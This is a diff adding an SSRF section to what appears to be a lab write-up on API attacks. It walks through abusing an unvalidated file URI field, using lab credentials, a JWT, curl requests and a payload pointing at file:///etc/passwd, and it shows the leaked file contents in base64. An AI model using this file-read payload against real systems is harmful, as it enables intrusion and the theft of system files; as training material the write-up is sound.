@@ -17,7 +17,7 @@ This document outlines common techniques for identifying and exploiting **API re
   - [Broken Function Level Authorization (BFLA)](#broken-function-level-authorization-bfla)
   - [Unrestricted Access to Sensitive Business Flows](#unrestricted-access-to-sensitive-business-flows)
   - [Server Side Request Forgery (SSRF)](#server-side-request-forgery-ssrf)
-  
+
 ---
 
 ## Overview
@@ -1074,3 +1074,179 @@ This demonstrates how **business logic vulnerabilities** can be chained with tec
 ---
 
 ## Server Side Request Forgery (SSRF)
+
+An API is vulnerable to **Server-Side Request Forgery (SSRF)** when it uses **user-controlled input to fetch local or remote resources without proper validation**. SSRF vulnerabilities occur when an application blindly trusts user-supplied URLs or resource identifiers, allowing an attacker to coerce the server into making requests to unintended destinations.
+
+The target is vulnerable to [CWE-918, Server-Side Request Forgery](https://cwe.mitre.org/data/definitions/918.html). 
+
+A brief description of the weakness is shown below:
+
+```
+The web server receives a URL or similar request from an upstream component and retrieves the contents of this URL, but it does not sufficiently ensure that the request is being sent to the expected destination
+```
+
+Authentication is performed via the `/api/v1/authentication/suppliers/sign-in` endpoint:
+
+```
+{
+  "Email": "htbpentester10@pentestercompany.com",
+  "Password": "HTBPentester10"
+}
+```
+
+The server responds with a valid JWT:
+
+```json
+{
+  "jwt": "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjEwQHBlbnRlc3RlcmNvbXBhbnkuY29tIiwiaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93cy8yMDA4LzA2L2lkZW50aXR5L2NsYWltcy9yb2xlIjpbIlN1cHBsaWVyQ29tcGFuaWVzX1VwZGF0ZSIsIlN1cHBsaWVyQ29tcGFuaWVzX1VwbG9hZENlcnRpZmljYXRlT2ZJbmNvcnBvcmF0aW9uIl0sImV4cCI6MTc2ODA4MTUxNiwiaXNzIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiIsImF1ZCI6Imh0dHA6Ly9hcGkuaW5sYW5lZnJlaWdodC5odGIifQ.om7XssOTdrfDaoOORCf65tcN8I3cXaxg_mIKhJhSPe29l0V2TI_gCRiMX_mwlxR39YLQGee-qxUXWnMhwHyh5A"
+}
+```
+
+After authorizing with the JWT, querying `/api/v1/roles/current-user` reveals that the authenticated user has the following roles assigned:
+
+- `SupplierCompanies_Update`
+- `SupplierCompanies_UploadCertificateOfIncorporation`
+
+![Filtered output](images/ssrf.PNG)
+
+Reviewing the **Supplier-Companies** section reveals three endpoints associated with the assigned roles:
+
+- `/api/v1/supplier-companies`
+- `api/v1/supplier-companies/{ID}/certificates-of-incorporation`
+- `/api/v1/supplier-companies/certificates-of-incorporation`
+
+![Filtered output](images/ssrf2.PNG)
+
+Invoking the `/api/v1/supplier-companies/current-user` endpoint confirms that the authenticated user belongs to the supplier company with the following ID:
+
+```json
+b75a7c76-e149-4ca7-9c55-d9fc4ffa87be
+```
+
+```json
+{
+  "supplierCompany": {
+    "id": "b75a7c76-e149-4ca7-9c55-d9fc4ffa87be",
+    "name": "PentesterCompany",
+    "email": "supplier@pentestercompany.com",
+    "isExemptedFromMarketplaceFee": 0,
+    "certificateOfIncorporationPDFFileURI": "CompanyDidNotUploadYet"
+  }
+}
+```
+
+![Filtered output](images/ssrf3.PNG)
+
+The `/api/v1/supplier-companies/certificates-of-incorporation` **POST** endpoint allows supplier-company staff to upload a certificate of incorporation in PDF format. This endpoint requires the `SupplierCompanies_UploadCertificateOfIncorporation` role, which we possess.
+
+We first create a 30 MB PDF file:
+
+```bash
+dd if=/dev/urandom of=certificate-of-incorporation.pdf bs=1M count=30
+```
+We then upload the file, specifying our supplier company ID:
+
+```bash
+curl -X 'POST' \
+  'http://94.237.53.219:55044/api/v1/supplier-companies/certificates-of-incorporation' \
+  -H 'accept: application/json' \
+  -H 'Authorization: Bearer <JWT>' \
+  -H 'Content-Type: multipart/form-data' \
+  -F 'CertificateOfIncorporationPDFFormFile=@certificate-of-incorporation.pdf;type=application/pdf' \
+  -F 'CompanyID=b75a7c76-e149-4ca7-9c55-d9fc4ffa87be'
+```
+
+Reponse:
+
+```json
+{
+  "successStatus": true,
+  "fileURI": "file:///app/wwwroot/SupplierCompaniesCertificatesOfIncorporations/certificate-of-incorporation.pdf",
+  "fileSize": 31457280
+}
+```
+
+The API stores the file location using the `file://` URI scheme, which references local filesystem paths.
+
+Querying `/api/v1/supplier-companies/current-user` again confirms that the `certificateOfIncorporationPDFFileURI` field now contains the uploaded file’s local path:
+
+```json
+{
+  "supplierCompany": {
+    "id": "b75a7c76-e149-4ca7-9c55-d9fc4ffa87be",
+    "name": "PentesterCompany",
+    "email": "supplier@pentestercompany.com",
+    "isExemptedFromMarketplaceFee": 0,
+    "certificateOfIncorporationPDFFileURI": "file:///app/wwwroot/SupplierCompaniesCertificatesOfIncorporations/certificate-of-incorporation.pdf"
+  }
+}
+```
+
+![Filtered output](images/ssrf4.PNG)
+
+The `/api/v1/supplier-companies` **PATCH** endpoint requires the `SupplierCompanies_Update` role and allows supplier-company staff to update company attributes, including the `CertificateOfIncorporationPDFFileURI` field:
+
+```json
+{
+  "UpdatedSupplierCompany": {
+    "SupplierCompanyID": "string",
+    "IsExemptedFromMarketplaceFee": 1,
+    "CertificateOfIncorporationPDFFileURI": "string"
+  }
+}
+```
+![Filtered output](images/ssrf5.PNG)
+
+Because the API does not validate the URI scheme or file path, we can perform an **SSRF / Local File Inclusion (LFI)** attack by pointing the field to an arbitrary local file:
+
+```json
+{
+  "UpdatedSupplierCompany": {
+    "SupplierCompanyID": "b75a7c76-e149-4ca7-9c55-d9fc4ffa87be",
+    "IsExemptedFromMarketplaceFee": 1,
+    "CertificateOfIncorporationPDFFileURI": "file:///etc/passwd"
+  }
+}
+```
+
+![Filtered output](images/ssrf6.PNG)
+
+Response:
+
+```json
+{
+  "successStatus": true
+}
+```
+
+The lack of validation confirms that the API blindly trusts user-controlled file URIs.
+
+Next, we invoke the `/api/v1/supplier-companies/{ID}/certificates-of-incorporation` **GET** endpoint to retrieve the contents of the file referenced by `CertificateOfIncorporationPDFFileURI`:
+
+```bash
+curl -X 'GET' \
+  'http://94.237.53.219:55044/api/v1/supplier-companies/b75a7c76-e149-4ca7-9c55-d9fc4ffa87be/certificates-of-incorporation' \
+  -H 'accept: application/json' \
+  -H 'Authorization: Bearer <JWT>'
+```
+
+Response:
+
+```json
+{
+  "successStatus": true,
+  "base64Data": "cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovcnVuL2lyY2Q6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjQyOjY1NTM0Ojovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4Kbm9ib2R5Ong6NjU1MzQ6NjU1MzQ6bm9ib2R5Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgphcHA6eDoxNjU0OjE2NTQ6Oi9ob21lL2FwcDovYmluL3NoCg=="
+}
+```
+
+![Filtered output](images/ssrf7.PNG)
+
+Decoding the base64 data reveals the contents of `/etc/passwd`:
+
+```bash
+echo "<base64 string>" | base64 -d
+```
+
+![Filtered output](images/ssrf8.PNG)
+
+---
